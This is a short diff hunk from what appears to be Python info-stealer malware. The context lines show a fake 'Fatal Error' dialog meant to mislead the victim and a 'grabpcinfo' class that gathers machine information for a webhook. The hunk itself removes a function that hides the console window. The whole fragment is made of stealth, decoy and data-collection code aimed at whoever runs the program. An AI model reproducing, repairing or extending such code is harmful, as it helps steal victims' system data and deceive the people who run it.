@@ -82,9 +82,6 @@ def try_extract(func):
 def fakeerror():
     messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occured while importing modules.")
 
-def hide():
-    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
-
 class grabpcinfo():
     def __init__(self) -> None:
         self.get_inf(__WEBHOOK__)
